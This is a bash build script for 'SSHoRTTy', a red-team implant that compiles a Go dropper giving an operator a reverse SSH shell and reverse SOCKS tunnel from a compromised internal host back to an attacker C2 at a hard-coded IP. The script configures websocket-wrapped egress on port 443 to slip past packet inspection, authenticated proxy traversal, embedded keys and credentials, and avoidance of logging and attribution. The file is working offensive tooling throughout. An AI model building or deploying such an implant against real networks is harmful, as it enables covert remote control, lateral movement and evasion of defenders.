#!/bin/bash

#####################################################################################################
#
#       SSHoRTTy: Linux (future Mac) SSH real time shell implant
#           - Build custom versions for every environment
#           - Achieve full shell on internal host over reverse SSH tunnels.
#             readline, history, terminal UI, scp, sftp over the same chanel
#             SOCKS support out of the box
#             Future:  X forward, direct local and remote port tunnels.
#           - Armorized egress from corporate environment over websockets
#           - Proxy awareness and ability to have credentials support
#             Future: HTTP/2 tunnels
#
#           Future: Ability to specify and control commands run in restricted shells by junior RTOs.
#


####################### BUILD CONFIGURATION #########################################################
#           === Straight SSH Tunnel ===
#
# Goals:
#       - Do not use local SSH clients, drop your own. Avoids logging
#       - Cannot task employees to run convoluted SSH commands for us. One binary launch.
#       - Default SOCKS ports for convenience of the Red team operator.
#       - Achieves distributed nature of the connectivity and helps avoid attribution
#
# [Organization]  ----- |Internet| ------ [Attacker C2]
#
#      (Dropper)  ------ Call back ------> SSH Server -------------------|
#                                                                        |  Attacker SSH shell client
# 1. Internal Host <==== SSH Client <= Reverse Shell ==== SSH Server ----|          (rendezvous)
#                                                                        |  Attacker Browser+SOCKS
# 2. Internal Hosts N <==== SSH Client <= Reverse SOCKS ==== SSH Server -|
#    Internal Hosts N+1

# "rendezvous" External tunnels from Red team operator to a C2 to a reverse tunnel. I have to draw it out ;)




#           === Websocket Armorized SSH Tunnel ===
#
# Goals:
#       - Hide from egress deep packet inspection catching SSH traffic
#       - Allow mimicry of a legitimate websocket traffic
#       - Work with a potential outbound proxy, support authentication
#       - Egress on port 443
#
# How it fits in the overall design:
#
#
# [Organization]  ------------------------|Internet| -- [Attacker C2]
#
# (Dropper)  -----> <company egress proxy> ----------> Red Websocket proxy
#                                                   | --> TCP tunnel --> Red SSH Server
#                                                                         |--> rendezvous SOCKS ports
#                                                                                   ^
#                                                            Private SSH for Red ___|
#                                                                        ^
#                                        Red Team oper __________________|
#
#


# SSH SSHServer (host)
# Proper publicly visible SSH host to connect/redirect to
# Please note: without armorized tunnels this is the only option to reach SSH server
# SSHServerHost=167.99.88.24

# When using armorized tunnels like websockify over WSS:// you may have more exit options
# For example, if the WSS:// exit host is multihomed you could connect to the second network's SSH server
# SSHServerHost=10.16.0.5
# Or, you can even listen SSH on the localhost only if directly terminating agents on the WSS:// exit host
# This affords no exposure of SSH port to the wild at all.
SSHServerHost=127.0.0.1

# SSH port the C2 server or a redirect listens on for agents on the exit node
#
SSHServerPort=222

# Implant Agent SSH account.
# You just need an OS account the private key the implant has to connect to the SSH server with
SSHServerUser=4fa48c653682c3b04add14f434a3114

## Implant SSH protected private key
# Option A: Local encrypted key wrapped in Base64 which gets embedded into the implant
# If file is embedded no remote SSH key fetch is made from the hosting server
SSHServerUserKey=$( /bin/cat "./keys/agentx.sshkey_kg_enc.b64" )

# Option B: if the key needs to be pulled remotely
# The agent pulls the protected key and decrypts a key with a password.
# This is not SSH PK encryption, but a SSHORTY's "on the wire" protection scheme.
# Why not a direct pass-phrase encrypted SSH PK? Because there are a ton of SSH key file formats.
# For now we want to deal with a straight RSA 4096 keys, without relying on OpenSSH format quirks.
# tool: keygen.go
SSHServerUserKeyUrl="http://127.0.0.1:9000/agentx.sshkey_kg_enc.b64"

# Implant SSH protection password (wire safety)
# tool: keygen.go
SSHServerUserKeyPassphrase=password

# Channel IP for reverse SSH tunnel (addr)
# After the initial SSH session is established - listen on SSH and SOCKS ports on this address for reverse tunnels
SSHRemoteCmdHost=127.0.0.1
# Channel IP for reverse SSH tunnel (port)
SSHRemoteCmdPort=2022
# Channel IP for reverse tunnel SOCKS (addr)
SSHRemoteSocksHost=127.0.0.1
# Channel IP for reverse tunnel SOCKS (port)
SSHRemoteSocksPort=1080


# Operator Implant logon (user)
# Since we are distributing randezvous SSH sockets, what is the reverse tunnels' user should be
# This is used for an additional authentication to protect reverse tunnels from the RT insiders
SSHRemoteCmdUser=operator

# Operator Implant logon (password)
# Randomized on every build.
# Ex: SSHRemoteCmdPwd=da39a3ee5e6b4b0d3255bfef9560189
SSHRemoteCmdPwd=$( dd if=/dev/urandom bs=1024 count=1 | shasum | cut -c 1-31  )

# The implant introspects SHELL variable from the destination environment,
# If it is undefined it falls back to this:
SSHShell="/bin/sh"

#--------------- :: Transport :: -----------------#
# How do we get to the SSH tunnel.  WS/WSS and Proxies

# Intercepting Proxy (Burp)
# export http_proxy="http://127.0.0.1:8088"
HTTPProxyFromEnvironment="yes"

# Egress proxy
# TODO: HTTP/S proxy
HTTPProxy="http://167.99.88.24:8080" # Squid

# Egress proxy auth (plain)
# TODO: research NTLM if needed  https://github.com/vadimi/go-http-ntlm
HTTPProxyAuthUser="companyuser"
HTTPProxyAuthPass="Drag0n"


#---------- :: Armorized Carrier :: ---------------#
# WS/WSS endpoint:
HTTPEndpoint="http://167.99.88.24:8082"

# WS/WSS endpoint:
WSEndpoint="wss://167.99.88.24:8082/stream"

# Implant Exe name
DropperName="rssh"


#----------- :: Implant Daemon and Debugging :: ---#
# Background and detach from console. Currently, not very elegant (no setsid(), no renaming)
Daemonize="no"

# Log progress messages to file (local debug)
# We do not want to log in production, but we want to debug to a log file locally
LogFile="/tmp/rssh.log"

# Track the implant PID
PIDFile="/tmp/rssh.pid"



echo "[*] Building dropper"
export GOOS=darwin GOARCH=amd64
##export GOOS=linux GOARCH=amd64

go build -ldflags \
	"-s -w \
     -X main.SSHServerPort=${SSHServerPort}  \
     -X main.SSHServerHost=${SSHServerHost} \
     -X main.SSHServerUser=${SSHServerUser} \
     -X main.SSHServerUserKey=${SSHServerUserKey} \
     -X main.SSHServerUserKeyUrl=${SSHServerUserKeyUrl} \
     -X main.SSHServerUserKeyPassphrase=${SSHServerUserKeyPassphrase} \
     -X main.SSHRemoteCmdHost=${SSHRemoteCmdHost}  \
     -X main.SSHRemoteCmdPort=${SSHRemoteCmdPort} \
     -X main.SSHRemoteCmdUser=${SSHRemoteCmdUser} \
     -X main.SSHRemoteCmdPwd=${SSHRemoteCmdPwd} \
     -X main.SSHRemoteSocksHost=${SSHRemoteSocksHost} \
     -X main.SSHRemoteSocksPort=${SSHRemoteSocksPort} \
     -X main.HTTPProxyFromEnvironment=${HTTPProxyFromEnvironment} \
     -X main.HTTPProxy=${HTTPProxy} \
     -X main.HTTPProxyAuthUser=${HTTPProxyAuthUser} \
     -X main.HTTPProxyAuthPass=${HTTPProxyAuthPass} \
     -X main.HTTPEndpoint=${HTTPEndpoint} \
     -X main.WSEndpoint=${WSEndpoint} \
     -X main.LogFile=${LogFile} \
     -X main.PIDFile=${PIDFile}  \
     -X main.Daemonize=${Daemonize}" \
     -o ${DropperName} ./rssh.go \
     ./types.go ./vars.go ./Pty.go ./socksport.go ./keymgmt.go ./traffic.go

if [[ $? -eq 0 ]]
then
    echo "[*] Dropper Information (keep it safe):"
    printf "    %s\n" "#######################"
    printf "    %s\n" "Dropper File: ${DropperName} ($(stat -f '%z bytes' ${DropperName}))"
    printf "    %s\n" "SSH SSHServerHost=${SSHServerHost}"
    printf "    %s\n" "SSH SSHServerPort=${SSHServerPort}"
    printf "    %s\n" "SSH SSHServerUser=${SSHServerUser}"
    printf "    %s\n" "SSH SSHServerUserKeyUrl=${SSHServerUserKeyUrl}"
    printf "    %s\n" "SSH SSHServerUserKeyPassphrase=${SSHServerUserKeyPassphrase}"
    printf "    %s\n" "SSH-RT SSHRemoteCmdHost=${SSHRemoteCmdHost}"
    printf "    %s\n" "SSH-RT SSHRemoteCmdPort=${SSHRemoteCmdPort}"
    printf "    %s\n" "SSH-RT SSHRemoteCmdUser=${SSHRemoteCmdUser}"
    printf "    %s\n" "SSH-RT SSHRemoteCmdPwd=${SSHRemoteCmdPwd}"
    printf "    %s\n" "SSH-RTS SSHRemoteSocksHost=${SSHRemoteSocksHost}"
    printf "    %s\n" "SSH-RTS SSHRemoteSocksPort=${SSHRemoteSocksPort}"
    printf "    %s\n" "SSH-RT shell agent password: ${SSHRemoteCmdPwd} "
    printf "    %s\n" "HTTP Proxy: ${HTTPProxy} "
    printf "    %s\n" "HTTP Proxy:(from env?) ${HTTPProxyFromEnvironment} "
    printf "    %s\n" "HTTP Proxy AuthUser ${HTTPProxyAuthUser} "
    printf "    %s\n" "HTTP Proxy AuthPass ${HTTPProxyAuthPass+<masked>} "
    printf "    %s\n" "HTTP Endpoint: ${HTTPEndpoint} "
    printf "    %s\n" "WS Endpoint: ${WSEndpoint} "
    printf "    %s\n" "LogFile: ${LogFile} "
    printf "    %s\n" "#######################"
    printf "\n    %s\n" "   Usage SSH-RT: ssh ${SSHRemoteCmdUser}@${SSHRemoteCmdHost} -p ${SSHRemoteCmdPort} "
    printf "    %s\n" "   Usage SSH-RTS: browser SOCKS proxy: ${SSHRemoteSocksHost}:${SSHRemoteSocksPort} "
fi


# upx --brute ./rssh
# 7.1 vs. 1.7 mb
